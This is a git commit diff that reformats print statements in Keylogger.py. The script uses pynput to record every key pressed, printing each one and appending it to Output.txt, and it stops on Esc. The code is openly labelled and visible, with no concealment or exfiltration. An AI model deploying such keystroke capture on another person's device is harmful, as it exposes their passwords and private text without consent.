6918ddb862513156616a8d1e81d38b8ac9855a45
hreamer <reamer.hudson@gmail.com>
2020-10-17 15:09:39 -0400

    Made the code prettier

--- Keylogger.py
+++ Keylogger.py
@@ -3,19 +3,16 @@ from pynput import keyboard
 def on_press(key):
     file1 = open("Output.txt","a")
     try:
-        print('alphanumeric key {0} pressed'.format(
-            key.char))
+        print('alphanumeric key {0} pressed'.format(key.char))
         file1.write(key.char + '\n')
     except AttributeError:
-        print('special key {0} pressed'.format(
-            key))
+        print('special key {0} pressed'.format(key))
         file1.write('{0}\n'.format(key))
     finally:
         file1.close()
 
 def on_release(key):
-    print('{0} released'.format(
-        key))
+    print('{0} released'.format(key))
     if key == keyboard.Key.esc:
         # Stop listener
         return False
